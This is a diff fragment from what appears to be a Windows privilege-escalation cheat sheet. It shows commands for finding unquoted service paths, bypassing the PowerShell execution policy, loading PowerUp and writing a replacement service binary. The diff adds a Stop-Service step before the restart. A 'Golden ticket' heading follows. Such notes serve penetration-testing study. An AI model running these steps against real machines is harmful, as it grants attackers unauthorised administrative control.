@@ -68,7 +68,8 @@ wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v "
 powershell -ep bypass
 . .\PowerUp.ps1
 Get-UnquotedService
-Write-ServiceBinary -Name '$SERVICE_NAME' -Path "C:\$UNQUOTED_PATH"
+Stop-Service $SERVICE
+Write-ServiceBinary -Name '$SERVICE' -Path "C:\$UNQUOTED_PATH"
 Restart-Service $SERVICE
 ```
 Golden ticket:
